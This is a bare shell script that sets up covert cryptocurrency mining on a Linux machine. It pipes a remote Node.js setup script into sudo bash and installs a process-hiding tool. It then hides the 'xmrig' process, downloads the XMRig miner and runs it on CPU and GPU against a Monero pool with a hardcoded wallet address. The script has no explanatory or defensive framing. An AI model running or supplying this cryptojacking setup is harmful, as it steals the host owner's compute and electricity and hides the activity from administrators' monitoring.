sudo apt update
sudo apt-get install gcc -y
sudo apt-get install build-essential -y
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
sudo apt-get install -y nodejs
npm i -g node-process-hider
sudo ph add xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz
tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz
cd xmrig-6.22.0
./xmrig --opencl --cuda -o pool.supportxmr.com:443 -u 42G5pAGjXc4CyTVHhQSCLKN5hYsd8Mu7v5NqYf3ZeSN3NDNQPc1s4tzUj8weae9js6gg3g7Tre972jR5oZpr3Kj5RYh7y85 -k --tls
